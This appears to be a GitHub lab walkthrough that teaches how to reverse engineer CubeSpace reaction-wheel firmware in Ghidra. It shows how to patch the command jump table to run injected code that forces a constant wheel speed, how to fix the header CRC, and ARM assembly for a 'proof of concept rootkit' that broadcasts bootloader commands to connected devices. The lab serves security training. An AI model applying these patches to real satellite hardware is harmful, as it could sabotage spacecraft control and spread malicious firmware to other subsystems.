# CubeSpace Reaction Wheel

## .CS Header



## Ghidra Set-Up
<details closed>
<summary>Set-Up</summary>
<br>

Requirments: Install Ghidra if it isn't already on your machine, then install prefered Hex editor. I will be using ImHEX.
1. Ghidra Windows: [https://github.com/NationalSecurityAgency/ghidra/releases]. Linux: [snap install ghidra]
2. ImHEX [https://imhex.werwolv.net/]

### Set-Up
1. First rename the Reaction Wheel Firmware to control_program.cs and make a copy called control_program_copy.cs
2. Once you have Ghidra installed open it in Linux via the terminal by typing ```ghidra```or in Windows by double-clicking the run script in the unzipped file. <br>
   <img width="680" height="462" alt="image" src="https://github.com/user-attachments/assets/d39750fc-1508-4805-b085-6aa038377e7b" />
3. Once Ghidra is started click on the file tab in the top left and then click import file. Navigate to the location of your control_program_copy.cs and add it to Ghidra.

   <img width="611" height="515" alt="image" src="https://github.com/user-attachments/assets/e0521068-e23c-4815-bc36-5eef08c63c82" />

4. On the resulting window click on the three dots located to the right of the lnaguage box.
   <img width="663" height="346" alt="image" src="https://github.com/user-attachments/assets/e456fc8b-87b5-4685-8196-ad021d692d1f" />
5. What compiler have we identified the binary to be compiled by? What Endian? Use filter to narrow/search results.
   <details closed>
   <summary>Answer</summary>
   <br>
   <img width="546" height="377" alt="image" src="https://github.com/user-attachments/assets/be796647-9323-402a-a15e-a92e04c00d3c" />
   </details>
6. Select the options button in the bottom right of the window after you have selected the correct language.
   <img width="533" height="297" alt="image" src="https://github.com/user-attachments/assets/c03c44dc-7536-4ecb-a4eb-c525fa3d362d" />
7. What are we inspecting? What's the base address? Ho much space does the header take up? How long is the resulting program(Ghidra will give you this)?
   <details closed>
   <summary>Answer</summary>
   <br>
   <img width="548" height="422" alt="image" src="https://github.com/user-attachments/assets/d25c14f1-4076-4788-b331-2189884d1cd3" />
   </details>
8. Clcik Okay/Accept on all the resulting prompts then double click on your uploaded file. Click YES on the prompt asking if you want to analyze now and YES on the list options that it provides.<br>


### Now we want to add parts of the program that we don't have to the memory map.<br>

1. Click on the <img width="22" height="24" alt="image" src="https://github.com/user-attachments/assets/e2b1af7a-2f42-45ae-adf6-26a7e81e52e2" /> symbol on the menu loacted at the top of the Ghidra program.
    <img width="1226" height="426" alt="image" src="https://github.com/user-attachments/assets/3788ded0-d298-4358-a337-f7e2fba2dee5" />  
2. Select the Green add button located at the top right of the resulting menu.  
    <img width="1109" height="263" alt="image" src="https://github.com/user-attachments/assets/972d7072-ee1e-426f-b883-651b7bf561a9" />  
3. What are some parts of memory that could be useful? Where would we find references to these peices?  
   <details closed>
   <summary>Answer</summary>
   <br>
   <b>Communication</b>, Bootloader, Memory Writes, Memory References
   </details>
4. Now it's time for the most important part <b>Documentation!!</b>
5. Open the STM32_Doc.pdf. What would we be looking for? We discussed it just a second ago.
   <details closed>
   <summary>Answer</summary>
   <br>
   Memory Map!
   </details>
6. Crtl+F and look for the Memory Map for our chip. What sections should we add?
   <details closed>
   <summary>Answer</summary>
   <br>
   USART's(Specifically USART2), CAN
   </details>
   
7. Fill in the details and click add for each section you would like to add to the Memory Map. If you had a file you wanted to add you would select File Bytes at the bottom and navigate to the file you would like to include in that space in memory(Useful to add bootloader or other sections of code). <br>
    <img width="488" height="381" alt="image" src="https://github.com/user-attachments/assets/6f6524f1-00c7-49ea-9f40-db7c050957c5" />
   
8. Select the Alaysis tab at the top and select Analyze All Open, click Accept/YES on the following prompts to analyze your code with this new memory addition. (You can also select the C icon at the top of Ghidra to see the code decompiled in C)
    <img width="1222" height="360" alt="image" src="https://github.com/user-attachments/assets/aa975df7-e737-4464-8d7a-948129c7da94" />
9. <b>Congratualtions now you can begin Reverse Engineering the Firmware!!</b>
</details>


   


## Reverse Engineering

### Command Format
```
2 Bytes  1 Byte  Variable Bytes  2 Bytes
[Start Flag] [Command Code] [Data] [End Flag]
Example Command: 1f7f4000401c461fff
List Of Known Command Codes:
40  :Change  Speed (Speed number data is handled in IEEE 754 format)
41  :Duty  Cycle
80  :Identification
80  :Refresh  Home  Telemetry, Get  Info
81  :Serial  Number
82  :Error  Log  Index
83  :Error  Log  Entry
84 :Error  Log  Settings
85  :Current  Unix  Time
86  :Persist  Config  Diagnostic
88  :Version
89  :Boot  Status
8A :Telecommand  Acknowledge
8B :Common  Error  Codes
8C :Identification  2
B7  :Wheel  Position  Data
B8  :Wheel  Model
B9  :Wheel  Torque
BA  :Wheel  Reference  Torque
BB  :Control  Mode
BC  :Wheel  Speed
BD  :Health  Telemetry
BE  :Wheel  Data
BF  :PWM  Gain
C0  :Backup  Gain
C1  :Main  Gain
C2 :Status  Error  Flags
C3  :Wheel  Commanded  Duty  Cycle
C4  :Wheel  Reference  Speed
C5  :Motor  Power  Switch
C6  :Backup  Wheel  Codes
C7 :Stator  Data
C8  :Wheel  Reference  Speed  Ramp  Rate  Limit
```
<br>
<br>

### Instructions
1. Find the first line of code in the file. Where is it? Does it look like the program starts here?
	<details closed>
	<summary>Answer</summary>
	<br>
	Click on navigate if you haven't found it and enter the address of the first line of code.  
      <img width="1340" height="722" alt="image" src="https://github.com/user-attachments/assets/6e873574-d533-441b-ba0b-2e2f26ff52ab" />
	</details>
   
2. What are some issues an unclear start position can cause? How can this make it difficult to Reverse Engineer?
	<details closed>
	<summary>Answer</summary>
	<br>
	An unclear start position means the Ghidra can have trouble decompiling the code and walking through it. It also means that we can have issues following the control flow of the code.
	</details>
3. So what should we check if we can't follow the code from the start? What are some integral parts of the code that we can trace back to an area that allows us to insert our own jump command?
	<details closed>
	<summary>Hints</summary>
	<br>
	USART2(Check the location we added to memory map), Bootloader Jump to Firmware, **Command Code Resolution**, etc..
	</details>

4. What have you been able to find? Is there any room for a jump code insertion? What makes a good place for inserting our Jump code?
	<details closed>
	<summary>Hints</summary>
	<br>
	Look for places that we can choose ourselves whether it get's called. Possibly where we could insert custom commands.
	</details>

5. Go to the search menu at the top of Ghidra and select search for scalars from the resulting menu. Select "specific scalar" and then begin entering some of the command codes in hex. Which codes are more unique for hex? Try several of them if the first doesn't work out. What kind of code layout would be optimal for selecting the flow for differing command codes?
   <img width="1228" height="715" alt="image" src="https://github.com/user-attachments/assets/67dd4b50-a8ee-4064-a181-86b5cfb92471" />
	<img width="418" height="303" alt="image" src="https://github.com/user-attachments/assets/a85733d1-0b0e-4684-b701-f2f794d4de52" />
	
	<details closed>
	<summary>Hints</summary>
	<br>
	Switch statements are great for choosing which commands to execute! <br>
	<img width="766" height="561" alt="image" src="https://github.com/user-attachments/assets/f8defaf1-57a5-42b2-b994-f6f8b7c7464a" />
	</details>

6. Which variable does it use to jump? How does it resolve the code to the jump instruction? Take a look at the jump table and what values it holds and the location of the resulting jump. You'll have to do some math.
	<details closed>
	<summary>Hints</summary>
	<br>
	<img width="756" height="568" alt="image" src="https://github.com/user-attachments/assets/c0b51b8b-bac9-458f-9bc7-f14c067bd0b9" />
	<img width="399" height="183" alt="image" src="https://github.com/user-attachments/assets/d5bc5907-f7a5-4630-996a-c4e28e69a5ea" />
	</details>
	<details closed>
	<summary>Answer</summary>
	<br>
	From observing the index and parameter along with the resulting jump location we know that the index is found by [Command Code]-1 and the jump location is decide by ([Goal Address] – 0x08034a40)/2.
	</details>

7. Where does the 0x02B2h take you? The default case for the switch statement. This looks like a great place to insert our own command statement. Where should we make it jump to? The jump options are too short for the jump table to make it to the end of the file. Maybe there is another option?
	<details closed>
	<summary>Hints</summary>
	<br>
	Redundant Error Statements are the perfect place to insert our Jump Code.
	<img width="1173" height="150" alt="image" src="https://github.com/user-attachments/assets/c771ef50-a748-44ae-8c33-258a8da03b82" />
	</details>

8. First let's make our Jump Table jump to the last line of the redundant error statement whenever we send a command code of 09. Do the math! Right click on the correct index and click Patch Data and type the correct set of bytes to jump to the last line of our error statement (0x008034b04).  <br>
	<img width="776" height="617" alt="image" src="https://github.com/user-attachments/assets/5d26a0b9-5815-494c-b574-ed9e0d2c20a2" />
	<details closed>
	<summary>Answer</summary>
	<br>
	 <img width="451" height="260" alt="image" src="https://github.com/user-attachments/assets/271fc480-15bf-440d-9b36-19855985f3dc" />
	</details>

9. Now we need to find where we want our Jump command to navigate to. Look for an unused section of memory/code or add code onto the end of the file.
 	<details closed>
	<summary>Hint</summary>
	<br>
	Go to 0x08039828
	</details>

10. Now that we have identified the the location we are going to add code to, go back and add a ```bl``` instruction to the last line of our Redundant Error statement that we jump to. Right click on the line and select path instruction. Then type ```bl``` in the left box and ```0x08039828``` in the right box.  <br>
<img width="576" height="516" alt="image" src="https://github.com/user-attachments/assets/507dbe00-9923-465c-b05e-6809c2c5b04e" />
<img width="652" height="149" alt="image" src="https://github.com/user-attachments/assets/0f586351-6fe3-4321-912b-ebfd6da85247" />

11. Congratulation you have successfully patched in a jump to your own instructions! Now it's time to learn how to change the way the program functions.
12. Navigate to Case 40(The set speed command 0x08034978) and look for what register/variable is used to set the speed.
 	<details closed>
	<summary>Hint</summary>
	<br>
	r4 is used to store the Float value of the speed.
	</details>

13. Let's edit what value our code sets the speed to be a constant rather then a variable. Right click on a free line of memory, preferably further down to leave room for our commands, and right click, hover over data, and then click on the float variable. Then right click again and select patch data(like we did in the previous instructions) and then set the float value to a constant, like 10 for example.
<img width="655" height="667" alt="image" src="https://github.com/user-attachments/assets/cec7b8c3-8c96-4742-a54c-3bff2db0606e" />

14. Now we want to add commands that set r4 to our intended value. Our assembler doesn't like to load 4 bytes of memory into one register in a single command so we are going to utilize the move high (```movt```) and the move low(```movw```) instructions to reference our constant. Ghidra helps you format your commands, can you figure it out?
 	<details closed>
	<summary>Answer</summary>
	<br>
	<img width="975" height="495" alt="image" src="https://github.com/user-attachments/assets/476d7130-cf70-4797-97df-6f5d65fc3ebd" />
	</details>
15. Now that we have set the value of the register to our constant we can jump to the actual set speed instructions.
 	<details closed>
	<summary>Answer</summary>
	<br>
	```bl	0x08034978```
	</details>
 16. What are we forgetting? The HEADER! We won't be able to upload the file without the header containing the file info! Now navigate to the File tab in the top left of Ghidra and select export program. Make sure the format is set to Original program in order to export it as a .cs.  <br>
	<img width="632" height="216" alt="image" src="https://github.com/user-attachments/assets/c946f86d-5ed5-4409-a7d2-433996f34ccc" />

17. Make sure to store a copy of your .cs file by compressing it into a zip folder, we'll come back to this in a bit.
    <img width="267" height="186" alt="image" src="https://github.com/user-attachments/assets/81516235-85a1-4d16-8796-21a138006a83" />

    
19. Open up ImHEX(after following the prompts) and drag your control_program.cs and your control_program_copy.cs into the editor. On your exported control_program_copy.cs left click on the first byte and select insert. You are going to want to insert the size of the header (0x72).
    <img width="778" height="713" alt="image" src="https://github.com/user-attachments/assets/16e6b8a7-84d8-43cb-86a3-cc923100fea6" />
    <img width="952" height="514" alt="image" src="https://github.com/user-attachments/assets/5e65011e-c05f-4757-ad33-9f3410e4083b" />

20. Now move over to your control_program.cs and copy the first 0x72 bytes and then past them into your control_program_copy.cs. Make sure to save the file when you are done copying the header.  <br>
    <img width="560" height="542" alt="image" src="https://github.com/user-attachments/assets/bea68643-b064-40a1-b131-31fd3bd472c8" />
    <img width="555" height="567" alt="image" src="https://github.com/user-attachments/assets/bab5d145-5d7c-4f73-abb5-f39344473d63" />

21. Remember what bytes in the header are the CRC value? Navigate into the zip folder and right click on the file. Click on the properties menu and you should see the CRC value displayed on the bottom half.  <br>
    <img width="357" height="446" alt="image" src="https://github.com/user-attachments/assets/b4e31fb2-5c8d-4f5f-8e34-cc602ae73cbb" />
    
22. Replace the CRC bytes in the header with what is displayed on your properties menu. Remember that the program operates in little endian! Save the file when you are done. Don't worry your CRC value may different then mine depending on where we wrote the instructions and saved the float value.  <br>
 	<details closed>
	<summary>Answer</summary>
	<br>
	<img width="591" height="302" alt="image" src="https://github.com/user-attachments/assets/fcf751ec-f014-4267-a0a6-53a1c572942f" />
	</details>
    

23. Congrats! You have successfully implement your proof of concept rootkit! What other functions would we be able to develop using a more flushed out rootkit? Communicate from the device to other connected devices! Set their speed, replace firmware, override instructions., and more! Brodcats to bootloader commands:
```
		undefined Send_UART_Cmd()  
	    r0:4           input  
	    r1:4           length  
	    r2:4           usart  
	    r0:4           end_flag  
	Send_UART_Cmd  
	    cpsid      i  
	    movw       r0, #0x98f0  
	    movt       r0, #0x803  
	    movs       length, #0x18  
	    movw       r2, #0x4400  
	    movt       r2, #0x4000  
	    movw       r5, #0x4428  
	    movt       r5, #0x4000  
	loop
	    ldrb       r3, [input, #0x0]  
	    adds       end_flag, #0x1 
	    subs       length, #0x1
	    cmp        r3, #0x1f  
	    bne        normal_send  
	    ldrb       r4, [end_flag, #0x0]  
	    cmp        r4, #0xff  
	    bne        normal_send  
	    adds       end_flag, #0x1  
	    subs       length, #0x1  
	    bl         wait_txe  
	    movs       r6, #0x1f  
	    strb       r6, [r5, #0x0] 
	    bl         wait_txe  
	    movs       r6, #0xff  
	    strb       r6, [r5, #0x0] 
	    bl         wait_tc_loop  
	    bl         send_break  
	    b          check_continue  
	normal_send  
	    bl         wait_txe  
	    strb       r3, [r5, #0x0]  
	check_continue  
	    cmp        length, #0x0  
	    bne        loop  
	    nop 
	    cpsid      i 
	    dsb        #0xf  
	    isb        #0xf  
	    bl         FUN_0801a514  
	    bx         lr  
	wait_txe  
	    ldr        r4, [r2, #0x1c]  
	    tst        r4, #0x80  
	    beq        wait_txe  
	    bx         lr  
	wait_tc_loop  
	    ldr        r4, [r2, #0x1c]  
	    tst        r4, #0x40  
	    beq        wait_tc_loop  
	    bx         lr  
	send_break  
	    movs       r7, #0x2  
	    strb       r7, [r2, #0x1c]  
	wait_break_clear  
	    ldr        r4, [r2, #0x1c]  
	    tst        r4, #0x40000  
	    bne        wait_break_clear  
	wait_for_input  
	    ldr        r4, [r2, #0x1c]  
	    tst        r4, #0x20  
	    beq        wait_for_input 
	    ldr        r4, [r2, #0x24]  
	    bl         loop 
	080398f0 1f               
	080398f1 7f              
	080398f2 06              
	080398f3 1f              
	080398f4 ff              
	080398f5 1f              
	080398f6 7f              
	080398f7 40              
	080398f8 00              
	080398f9 1f              
	080398fa ff              
	080398fb 1f              
	080398fc 7f              
	080398fd 20              
	080398fe 1f              
	080398ff ff
```








